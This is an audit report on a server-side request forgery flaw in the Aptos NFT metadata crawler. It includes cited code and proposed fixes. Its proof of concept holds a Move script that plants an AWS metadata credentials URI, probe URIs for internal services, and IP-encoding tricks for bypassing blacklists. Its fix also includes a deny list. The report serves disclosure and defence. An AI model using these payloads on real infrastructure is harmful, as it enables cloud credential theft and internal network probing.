# Audit Report

## Title
Server-Side Request Forgery (SSRF) in NFT Metadata Crawler via Malicious Collection URIs

## Summary
The Aptos NFT metadata crawler automatically fetches collection URIs from on-chain events without validating against internal IP addresses or cloud metadata services. An attacker can create a collection with a malicious URI (e.g., `http://127.0.0.1` or `http://169.254.169.254`) that passes on-chain validation, causing the indexer infrastructure to perform SSRF attacks against internal networks.

## Finding Description

The vulnerability exists across multiple layers:

**Layer 1 - Insufficient On-Chain Validation:**
The Move framework only validates URI length (≤512 bytes), not content. [1](#0-0) 

This allows any syntactically valid URI, including internal IP addresses, to be stored on-chain. [2](#0-1) 

**Layer 2 - Automatic URI Fetching:**
The NFT metadata crawler automatically fetches URIs extracted from collection events. The indexer stores these URIs: [3](#0-2) 

The Worker processes these URIs and makes HTTP requests: [4](#0-3) 

**Layer 3 - No SSRF Protection:**
The system performs only basic validation:
- URL syntax validation: [5](#0-4) 
- Substring-based blacklist checking: [6](#0-5) 

**No validation exists against private IP ranges (127.0.0.0/8, 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16).**

**Layer 4 - Multiple Request Vectors:**
The crawler makes HTTP HEAD requests to check metadata: [7](#0-6) 

It makes HTTP GET requests to fetch JSON content: [8](#0-7) 

And makes additional requests to fetch images: [9](#0-8) 

**Attack Path:**
1. Attacker creates collection with URI = `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Transaction executes successfully (only length validation)
3. CreateCollectionEvent emitted with malicious URI: [10](#0-9) 
4. Indexer extracts and stores URI
5. Metadata crawler Worker fetches the URI, performing SSRF against AWS metadata service
6. Attacker gains access to cloud credentials or internal service information

## Impact Explanation

**Medium Severity** - per Aptos bug bounty criteria:
- **Infrastructure Security Compromise**: Can probe internal networks, access cloud metadata services (AWS IMDSv1, GCP metadata, Azure IMDS), or scan internal ports
- **Information Disclosure**: Can leak cloud credentials, internal service configurations, or network topology
- **Limited to Infrastructure**: Does not affect consensus, validator operations, or on-chain state directly
- **Requires Indexer Infrastructure**: Only affects nodes running the NFT metadata crawler
- **No Direct Funds Loss**: Cannot steal or mint tokens directly

This falls under "State inconsistencies requiring intervention" and infrastructure security issues, qualifying as Medium severity (up to $10,000).

## Likelihood Explanation

**High Likelihood:**
- **Low Barrier to Entry**: Any user can create a collection by paying gas fees (≈0.001 APT)
- **Automatic Exploitation**: No user interaction required after collection creation
- **Wide Attack Surface**: All indexer nodes running metadata crawlers are vulnerable
- **Common Misconfiguration**: AWS IMDSv1 is still widely deployed and accessible
- **No Detection**: Simple blacklist can be bypassed with IP encoding variations (`127.1`, `2130706433` decimal, `0x7f.0.0.1` hex)

## Recommendation

Implement multi-layer SSRF protection:

**1. Add IP Address Validation in Metadata Crawler:**

```rust
// In ecosystem/nft-metadata-crawler/src/utils/ssrf_protection.rs (new file)
use std::net::{IpAddr, Ipv4Addr};
use url::Url;

pub fn is_safe_url(url_str: &str) -> anyhow::Result<()> {
    let url = Url::parse(url_str)?;
    
    // Only allow http/https schemes
    if !["http", "https"].contains(&url.scheme()) {
        return Err(anyhow::anyhow!("Invalid URL scheme"));
    }
    
    // Resolve hostname to IP
    if let Some(host) = url.host_str() {
        // Check if it's an IP address directly
        if let Ok(ip) = host.parse::<IpAddr>() {
            if is_private_ip(&ip) {
                return Err(anyhow::anyhow!("Private IP addresses not allowed"));
            }
        }
        
        // For domain names, would need DNS resolution with validation
        // This is more complex and should include DNS rebinding protection
    }
    
    Ok(())
}

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_loopback() ||
            ipv4.is_private() ||
            ipv4.is_link_local() ||
            ipv4.octets()[0] == 169 && ipv4.octets()[1] == 254 || // AWS metadata
            ipv4.octets()[0] == 0 // 0.0.0.0/8
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() ||
            ipv6.is_unspecified() ||
            (ipv6.segments()[0] & 0xfe00) == 0xfc00 // fc00::/7 ULA
        }
    }
}
```

**2. Update Worker to Use Validation:**

In `ecosystem/nft-metadata-crawler/src/parser/worker.rs`, add validation before line 127:

```rust
// Add after line 108
if let Err(e) = ssrf_protection::is_safe_url(&json_uri) {
    self.log_info("URI failed SSRF validation, marking as do_not_parse");
    self.model.set_do_not_parse(true);
    self.upsert();
    SKIP_URI_COUNT.with_label_values(&["ssrf_protection"]).inc();
    return Ok(());
}
```

**3. Add On-Chain Validation (Defense in Depth):**

While not foolproof (DNS rebinding), add basic checks in Move framework:

```move
// In aptos-move/framework/aptos-token/sources/token.move
const EURI_SUSPICIOUS: u64 = 50;

public fun create_collection(...) {
    // Existing length validation
    assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
    
    // Basic suspicious pattern detection
    assert!(
        !string::contains(&uri, &string::utf8(b"127.")) &&
        !string::contains(&uri, &string::utf8(b"localhost")) &&
        !string::contains(&uri, &string::utf8(b"169.254.")),
        error::invalid_argument(EURI_SUSPICIOUS)
    );
    
    // Rest of function...
}
```

**4. Implement DNS Rebinding Protection:**

Use a two-step DNS resolution process:
1. Resolve hostname to IP
2. Validate IP is not private
3. Re-resolve before actual HTTP request
4. Validate IP hasn't changed to private range

## Proof of Concept

**Step 1 - Create Malicious Collection (Move Script):**

```move
script {
    use aptos_token::token;
    use std::string;
    
    fun exploit_ssrf(attacker: &signer) {
        // AWS metadata service URI
        let malicious_uri = string::utf8(b"http://169.254.169.254/latest/meta-data/iam/security-credentials/");
        
        token::create_collection_script(
            attacker,
            string::utf8(b"Malicious Collection"),
            string::utf8(b"SSRF Test"),
            malicious_uri,
            0,  // unlimited
            vector[false, false, false]  // mutability config
        );
    }
}
```

**Step 2 - Expected Behavior:**

1. Transaction succeeds (only length validation)
2. CreateCollectionEvent emitted with URI: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Indexer processes event, stores URI in `current_collection_datas` table
4. NFT metadata crawler Worker picks up URI
5. Worker makes HTTP HEAD request to `169.254.169.254` (get_uri_metadata)
6. If metadata service returns valid response, Worker makes HTTP GET request
7. Attacker can observe responses through timing, error messages, or secondary channels

**Step 3 - Alternative Internal Service Probe:**

```move
// Probe internal Kubernetes service
let k8s_uri = string::utf8(b"http://10.96.0.1:443/api/v1/namespaces");

// Probe internal admin panel
let admin_uri = string::utf8(b"http://127.0.0.1:8080/admin/config");

// Probe internal database
let db_uri = string::utf8(b"http://192.168.1.100:5432/");
```

Each URI would cause the metadata crawler to probe the specified internal service, potentially leaking information through response times, error messages, or successful metadata extraction.

## Notes

- **Blacklist Bypass**: The current substring blacklist can be bypassed using IP encoding (decimal: `2130706433` for 127.0.0.1, hex: `0x7f.0.0.1`, octal: `0177.0.0.1`)
- **DNS Rebinding**: Domain-based attacks could bypass IP validation if DNS resolution isn't properly handled
- **IMDSv2 Protection**: AWS IMDSv2 requires session tokens, providing some protection, but IMDSv1 is still common
- **Rate Limiting**: The retry mechanism with exponential backoff may amplify SSRF impact
- **Multiple Request Vectors**: Both HEAD and GET requests are made, doubling the SSRF surface

### Citations

**File:** aptos-move/framework/aptos-token/sources/token.move (L1161-1200)
```text
    public fun create_collection(
        creator: &signer,
        name: String,
        description: String,
        uri: String,
        maximum: u64,
        mutate_setting: vector<bool>
    ) acquires Collections {
        assert!(name.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
        assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
        let account_addr = signer::address_of(creator);
        if (!exists<Collections>(account_addr)) {
            move_to(
                creator,
                Collections {
                    collection_data: table::new(),
                    token_data: table::new(),
                    create_collection_events: account::new_event_handle<CreateCollectionEvent>(creator),
                    create_token_data_events: account::new_event_handle<CreateTokenDataEvent>(creator),
                    mint_token_events: account::new_event_handle<MintTokenEvent>(creator),
                },
            )
        };

        let collection_data = &mut Collections[account_addr].collection_data;

        assert!(
            !collection_data.contains(name),
            error::already_exists(ECOLLECTION_ALREADY_EXISTS),
        );

        let mutability_config = create_collection_mutability_config(&mutate_setting);
        let collection = CollectionData {
            description,
            name,
            uri,
            supply: 0,
            maximum,
            mutability_config
        };
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L1215-1223)
```text
            event::emit_event<CreateCollectionEvent>(
                &mut collection_handle.create_collection_events,
                CreateCollectionEvent {
                    creator: account_addr,
                    collection_name: name,
                    uri,
                    description,
                    maximum,
                }
```

**File:** crates/indexer/src/models/token_models/collection_datas.rs (L126-126)
```rust
            let metadata_uri = collection_data.get_uri_trunc();
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L103-108)
```rust
        if Url::parse(&self.asset_uri).is_err() {
            self.log_info("URI is invalid, skipping parse, marking as do_not_parse");
            self.model.set_do_not_parse(true);
            SKIP_URI_COUNT.with_label_values(&["invalid"]).inc();
            return Ok(());
        }
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L127-127)
```rust
                JSONParser::parse(json_uri, self.parser_config.max_file_size_bytes)
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L386-391)
```rust
    fn is_blacklisted_uri(&mut self, uri: &str) -> bool {
        self.parser_config
            .uri_blacklist
            .iter()
            .any(|blacklist_uri| uri.contains(blacklist_uri))
    }
```

**File:** ecosystem/nft-metadata-crawler/src/lib.rs (L17-38)
```rust
pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    let headers = response.headers();

    let mime_type = headers
        .get(header::CONTENT_TYPE)
        .map(|value| value.to_str().unwrap_or("text/plain"))
        .unwrap_or("text/plain")
        .to_string();
    let size = headers
        .get(header::CONTENT_LENGTH)
        .and_then(|value| value.to_str().ok())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);

    Ok((mime_type, size))
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L55-64)
```rust
                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_JSON_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get JSON")?;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L56-65)
```rust
                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_IMAGE_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get image")?;
```
